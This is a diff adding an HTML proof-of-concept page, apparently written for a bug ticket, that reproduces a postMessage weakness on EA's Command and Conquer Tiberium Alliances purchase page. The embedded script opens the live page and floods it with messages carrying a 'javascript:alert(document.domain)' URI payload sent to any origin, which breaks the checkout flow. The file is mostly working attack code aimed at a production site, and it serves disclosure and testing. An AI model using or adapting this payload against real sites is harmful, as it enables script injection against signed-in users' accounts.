@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <script>
+      var b;
+
+      function run() {
+        b = window.open(
+          "https://www.ea.com/games/command-and-conquer/command-and-conquer-tiberium-alliances",
+          ""
+        );
+        setTimeout(() => {
+          b.postMessage(
+            '{"method":"redirectPrepare","payload":{"uri":"javascript:alert(document.domain)//"}}',
+            "*"
+          );
+        }, 5000);
+        setInterval(() => {
+          b.postMessage(
+            '{"method":"redirectReady","payload":{"uri":"javascript:alert(document.domain)//"}}',
+            "*"
+          );
+        }, 100);
+        return false;
+      }
+    </script>
+    <p>To reproduce the ticket issue:</p>
+    <p>
+      Please confirm you have signed into
+      <a href="https://ea.com" target="_blank">ea.com</a>, then click this
+      <a href="#" onclick="return run()">link</a> to open buy page, you can see
+      the it will open a new blank page, if go back to buy page, and click
+      "Purchase TA Funds", then open lockbox modal, you will see the checkout
+      flow is destroyed.
+    </p>
+
+    <p>
+      Now the buy page is prod CCTA Offers, if you want to verify test page,
+      please replace the link url inside above script code `window.open()` with
+      your test page url.
+    </p>
+  </body>
+</html>
